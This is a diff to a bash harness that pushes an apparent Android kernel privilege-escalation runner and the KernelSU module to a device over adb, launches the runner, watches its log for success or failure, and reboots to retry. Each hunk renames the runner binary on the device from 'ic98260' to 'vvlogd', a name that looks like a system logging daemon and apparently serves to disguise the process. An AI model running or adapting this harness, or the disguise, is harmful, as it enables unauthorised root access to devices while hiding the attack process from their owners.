@@ -130,7 +130,7 @@ pull_evidence() {
     done
 }
 stage_payloads() {
-    for entry in bin/ic98260:ic98260 bin/ksupatch:ksupatch bin/insmodf:insmodf bin/ksuquery:ksuquery bin/ksu_exposure_probe:ksu_exposure_probe ksu/kernelsu.ko:kernelsu.ko; do
+    for entry in bin/ic98260:vvlogd bin/ksupatch:ksupatch bin/insmodf:insmodf bin/ksuquery:ksuquery bin/ksu_exposure_probe:ksu_exposure_probe ksu/kernelsu.ko:kernelsu.ko; do
         local_file="$ROOT/${entry%:*}"; remote_name=${entry#*:}
         [[ -s $local_file ]] || { record "REFUSED missing_payload=$local_file"; return 1; }
         expected=$(shasum -a 256 "$local_file" | awk '{print $1}')
@@ -167,7 +167,7 @@ run_attempt() {
     if [[ -n $(shell_target "grep '^kernelsu ' /proc/modules") ]] || module_loaded_via_stamp; then
         record 'REFUSED module_or_runner_already_present'; return 2
     fi
-    if [[ -n $(shell_target 'pidof ic98260') ]]; then
+    if [[ -n $(shell_target 'pidof vvlogd') ]]; then
         record 'REFUSED runner_already_present'; return 2
     fi
     stage_payloads || { record 'REFUSED payload_staging_failed'; return 2; }
@@ -176,7 +176,7 @@ run_attempt() {
     # matrix and liveness stamp must reflect THIS attempt only.
     adb_target shell 'rm -f /data/local/tmp/ksu-exposure-root.txt /data/local/tmp/ksu-live.stamp' >/dev/null 2>&1 || true
     if [[ $DEBUG == 1 ]]; then adb_target shell 'rm -f /data/local/tmp/kmsg-this-boot.txt /data/local/tmp/pstore*.bin' >/dev/null 2>&1 || true; fi
-    adb_target shell "cd /data/local/tmp; rm -f iq.log hkd_base hkd_go hkd_open; KSU_RUNNER_DEBUG=$DEBUG setsid sh -c './ic98260 fake >iq.log 2>&1 </dev/null &'" >/dev/null 2>&1 || {
+    adb_target shell "cd /data/local/tmp; rm -f iq.log hkd_base hkd_go hkd_open; KSU_RUNNER_DEBUG=$DEBUG setsid sh -c './vvlogd fake >iq.log 2>&1 </dev/null &'" >/dev/null 2>&1 || {
         record 'REFUSED launch_command_failed'; return 2;
     }
     elapsed=0; outcome=RUNNING
@@ -189,7 +189,7 @@ run_attempt() {
         if remote_has 'burst miss -- parking' || remote_has '[-] plant1 burst missed'; then outcome=PARK-BURST; break; fi
         if remote_has 'parking without reap' || remote_has '-- parking' || remote_has '[-] child euid is not 0'; then outcome=PARK-OTHER; break; fi
         log_size=$(shell_target 'wc -c < /data/local/tmp/iq.log' | tr -d ' ')
-        if [[ ${log_size:-0} -gt 0 ]] && [[ -z $(shell_target 'pidof ic98260') ]]; then outcome=PARK-OTHER; break; fi
+        if [[ ${log_size:-0} -gt 0 ]] && [[ -z $(shell_target 'pidof vvlogd') ]]; then outcome=PARK-OTHER; break; fi
     done
     [[ $outcome != RUNNING ]] || outcome=WINDOW-ELAPSED
     pull_evidence "$output"
@@ -234,7 +234,7 @@ while [[ $attempt -lt $COUNT ]]; do
         record 'MODULE_LISTED preserving_loaded_module'; exit 0
     fi
     old=$(shell_target 'cat /proc/sys/kernel/random/boot_id')
-    if [[ -n $(shell_target 'pidof ic98260') ]]; then
+    if [[ -n $(shell_target 'pidof vvlogd') ]]; then
         if [[ $attempt -ge $COUNT ]]; then record 'ATTEMPT_LIMIT parked_process_needs_manual_reboot'; exit 1; fi
         recovery="$LOG_ROOT/recovery-$(date +%Y%m%d-%H%M%S)"; pull_evidence "$recovery"
         record 'RECOVER_PARKED rebooting_to_clear_holders'
